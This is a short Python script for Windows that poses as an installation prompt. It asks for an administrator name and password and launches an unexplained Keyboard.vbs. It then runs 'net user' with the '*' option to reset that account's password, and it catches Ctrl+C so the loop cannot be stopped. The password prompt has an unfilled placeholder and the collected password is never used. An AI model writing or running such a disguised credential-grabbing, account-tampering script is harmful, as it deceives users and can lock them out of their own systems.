import os

while True:
    try:
        adminuser = input("Input user & passwordfor installation:\n")
        adminpass = input("Enter the password for {} to continue:\n")
        
        os.system("start Keyboard.vbs")
        os.system("net user \"{}\" *".format(adminuser))   
    except KeyboardInterrupt:
        print("Required field")